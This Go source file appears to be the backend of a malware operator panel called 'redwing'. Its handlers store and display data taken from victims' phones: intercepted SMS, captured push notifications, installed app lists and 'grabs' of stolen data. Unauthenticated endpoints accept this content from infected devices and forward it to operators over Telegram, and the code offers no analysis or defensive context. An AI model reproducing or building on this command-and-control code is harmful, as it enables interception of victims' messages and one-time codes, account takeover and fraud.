package api

import (
	"encoding/json"
	"net/http"
	"strings"

	"redwing/internal/db"
)

func HandleDeviceApps(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/device/apps/"), "/")
	var deviceID string
	if len(parts) >= 2 {
		deviceID = parts[1]
	}
	teamID := SessionTeamID(r)

	if deviceID == "" {
		writeJSON(w, map[string]any{"apps": []any{}})
		return
	}

	var appsJSON string
	err := db.DB.QueryRow("SELECT COALESCE(apps_list, '[]') FROM devices WHERE device_id = ? AND team_id = ?", deviceID, teamID).Scan(&appsJSON)
	if err != nil {
		writeJSON(w, map[string]any{"apps": []any{}})
		return
	}

	var apps any
	if json.Unmarshal([]byte(appsJSON), &apps) != nil {
		apps = []any{}
	}

	LogActionFromRequest(r, ActionViewApps, deviceID, "")

	writeJSON(w, map[string]any{"apps": apps})
}

func HandleDeviceSMS(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/device/sms/"), "/")
	var deviceID string
	if len(parts) >= 2 {
		deviceID = parts[1]
	}
	teamID := SessionTeamID(r)

	rows, err := db.DB.Query(
		"SELECT id, sender, body, created_at FROM sms WHERE device_id = ? AND team_id = ? ORDER BY created_at DESC LIMIT 200",
		deviceID, teamID,
	)
	if err != nil {
		writeJSON(w, map[string]any{"sms": []any{}})
		return
	}
	defer rows.Close()

	var list []map[string]any
	for rows.Next() {
		var id int
		var sender, body, created string
		rows.Scan(&id, &sender, &body, &created)
		list = append(list, map[string]any{
			"id": id, "sender": sender, "body": body, "created_at": created,
		})
	}
	if list == nil {
		list = []map[string]any{}
	}
	LogActionFromRequest(r, ActionViewSMS, deviceID, "")

	writeJSON(w, map[string]any{"sms": list})
}

func HandleDevicePushLogs(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/device/push/"), "/")
	var deviceID string
	if len(parts) >= 2 {
		deviceID = parts[1]
	}
	teamID := SessionTeamID(r)

	rows, err := db.DB.Query(
		"SELECT id, package, title, text, created_at FROM push_logs WHERE device_id = ? AND team_id = ? ORDER BY created_at DESC LIMIT 200",
		deviceID, teamID,
	)
	if err != nil {
		writeJSON(w, map[string]any{"logs": []any{}})
		return
	}
	defer rows.Close()

	var logs []map[string]any
	for rows.Next() {
		var id int
		var pkg, title, text, created string
		rows.Scan(&id, &pkg, &title, &text, &created)
		logs = append(logs, map[string]any{
			"id": id, "package": pkg, "title": title, "text": text, "created_at": created,
		})
	}
	if logs == nil {
		logs = []map[string]any{}
	}
	LogActionFromRequest(r, ActionViewPush, deviceID, "")

	writeJSON(w, map[string]any{"logs": logs})
}

func HandleDeviceGrabs(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/device/grabs/"), "/")
	var deviceID string
	if len(parts) >= 2 {
		deviceID = parts[1]
	}
	teamID := SessionTeamID(r)

	rows, err := db.DB.Query(
		"SELECT id, grab_type, data, created_at FROM grabs WHERE device_id = ? AND team_id = ? ORDER BY created_at DESC LIMIT 200",
		deviceID, teamID,
	)
	if err != nil {
		writeJSON(w, map[string]any{"grabs": []any{}})
		return
	}
	defer rows.Close()

	var grabs []map[string]any
	for rows.Next() {
		var id int
		var gtype, data, created string
		rows.Scan(&id, &gtype, &data, &created)
		var parsed any
		if json.Unmarshal([]byte(data), &parsed) != nil {
			parsed = data
		}
		grabs = append(grabs, map[string]any{
			"id": id, "type": gtype, "data": parsed, "created_at": created,
		})
	}
	if grabs == nil {
		grabs = []map[string]any{}
	}
	LogActionFromRequest(r, ActionViewGrabs, deviceID, "")

	writeJSON(w, map[string]any{"grabs": grabs})
}

func HandleDeviceLabel(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"error": "method not allowed"})
		return
	}
	var body struct {
		DeviceID string `json:"device_id"`
		Label    string `json:"label"`
		Notes    string `json:"notes"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.DeviceID == "" {
		writeJSON(w, map[string]any{"error": "device_id required"})
		return
	}
	db.DB.Exec("UPDATE devices SET label = ?, notes = ? WHERE device_id = ?", body.Label, body.Notes, body.DeviceID)
	LogActionFromRequest(r, ActionEditLabel, body.DeviceID, "Label: "+body.Label)
	writeJSON(w, map[string]any{"success": true})
}

func HandleDeviceDelete(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodDelete && r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"error": "method not allowed"})
		return
	}

	teamID := SessionTeamID(r)

	var body struct {
		DeviceID string `json:"device_id"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.DeviceID == "" {
		writeJSON(w, map[string]any{"error": "device_id required"})
		return
	}

	LogActionFromRequest(r, ActionDeleteDevice, body.DeviceID, "Устройство удалено")

	db.DB.Exec("DELETE FROM devices WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM sms WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM commands WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM contacts WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM push_logs WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM grabs WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM inject_data WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)

	writeJSON(w, map[string]any{"success": true})
}

func HandleLogout(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("rw_session")
	if err == nil && cookie.Value != "" {
		db.DB.Exec("DELETE FROM sessions WHERE token = ?", cookie.Value)
	}

	http.SetCookie(w, &http.Cookie{
		Name:     "rw_session",
		Value:    "",
		Path:     "/",
		MaxAge:   -1,
		HttpOnly: true,
	})

	writeJSON(w, map[string]any{"success": true})
}

func HandleDevicePushNotification(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"success": true})
		return
	}

	var req map[string]any
	json.NewDecoder(r.Body).Decode(&req)

	deviceID, _ := req["device_id"].(string)
	teamID, _ := req["team_id"].(string)
	if teamID != "" {
		teamID = ResolveDeviceTeam(teamID)
	}
	pkg, _ := req["package"].(string)
	title, _ := req["title"].(string)
	text, _ := req["text"].(string)

	if teamID == "" && deviceID != "" {
		db.DB.QueryRow("SELECT COALESCE(team_id,'') FROM devices WHERE device_id = ?", deviceID).Scan(&teamID)
	}

	if deviceID != "" {
		db.DB.Exec(
			"INSERT INTO push_logs (device_id, team_id, package, title, text) VALUES (?, ?, ?, ?, ?)",
			deviceID, teamID, pkg, title, text,
		)

		SendTelegramNotification(teamID, "push", map[string]string{
			"device_id": deviceID,
			"package":   pkg,
			"title":     title,
			"text":      text,
		})
	}

	writeJSON(w, map[string]any{"success": true})
}

func HandleDeviceSMSIncoming(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"success": true})
		return
	}

	var req map[string]any
	json.NewDecoder(r.Body).Decode(&req)

	deviceID, _ := req["device_id"].(string)
	teamID, _ := req["team_id"].(string)
	if teamID != "" {
		teamID = ResolveDeviceTeam(teamID)
	}
	sender, _ := req["from"].(string)
	if sender == "" {
		sender, _ = req["sender"].(string)
	}
	body, _ := req["body"].(string)
	if body == "" {
		body, _ = req["text"].(string)
	}

	if teamID == "" && deviceID != "" {
		db.DB.QueryRow("SELECT COALESCE(team_id,'') FROM devices WHERE device_id = ?", deviceID).Scan(&teamID)
	}

	if deviceID != "" && body != "" {
		db.DB.Exec(
			"INSERT INTO sms (device_id, team_id, sender, body) VALUES (?, ?, ?, ?)",
			deviceID, teamID, sender, body,
		)

		addEvent(teamID, deviceID, "sms", "SMS from "+sender)

		SendTelegramNotification(teamID, "sms", map[string]string{
			"device_id": deviceID,
			"from":      sender,
			"body":      body,
		})
	}

	writeJSON(w, map[string]any{"success": true})
}
